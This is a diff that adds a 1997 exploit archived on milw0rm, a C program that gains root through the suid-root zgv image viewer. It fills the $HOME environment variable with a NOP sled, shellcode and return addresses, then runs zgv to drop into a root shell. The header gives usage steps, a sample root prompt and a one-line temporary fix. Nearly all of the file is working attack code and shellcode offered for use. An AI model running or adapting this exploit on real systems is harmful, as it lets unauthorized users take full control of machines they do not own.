@@ -1,0 +1,58 @@
+/*
+ *
+ * zgv exploit coded by BeastMaster V on June 20, 1997
+ *
+ * USAGE:
+ *   For some strage reason, the filename length of this
+ *   particular exploit must me one character long, otherwise you
+ *   will be drop into a normal unpriviledged shell. Go Figure....
+ *
+ *   $ cp zgv_exploit.c n.c
+ *   $ cc -o n n.c
+ *   $ ./n
+ *   Oak driver: Unknown chipset (id =  0)
+ *   bash#
+ *
+ * EXPLANATION: zgv (suid root) does not check bounds for $HOME env.
+ * TEMPORARY FIX:  chmod u-s /usr/bin/zgv
+ * NOTE: Don't forget to visit http://www.rootshell.com for more exploits.
+ * DISCLAIMER: Please use this in a responsible manner.
+ * 
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+char *shellcode =
+  "\x31\xc0\xb0\x31\xcd\x80\x93\x31\xc0\xb0\x17\xcd\x80\x68\x59\x58\xff\xe1"
+  "\xff\xd4\x31\xc0\x99\x89\xcf\xb0\x2e\x40\xae\x75\xfd\x89\x39\x89\x51\x04"
+  "\x89\xfb\x40\xae\x75\xfd\x88\x57\xff\xb0\x0b\xcd\x80\x31\xc0\x40\x31\xdb"
+  "\xcd\x80/"
+  "/bin/sh"
+  "0";
+
+char *get_sp() {
+   asm("movl %esp,%eax");
+}
+
+#define bufsize 4096
+char buffer[bufsize];
+
+main() {
+  int i;
+
+  for (i = 0; i < bufsize - 4; i += 4)
+    *(char **)&buffer[i] = get_sp() -4675;
+
+  memset(buffer, 0x90, 512);
+  memcpy(&buffer[512], shellcode, strlen(shellcode));
+
+  buffer[bufsize - 1] = 0;
+
+  setenv("HOME", buffer, 1);
+
+  execl("/usr/bin/zgv", "/usr/bin/zgv", NULL);
+}
+
+// milw0rm.com [1997-06-20]
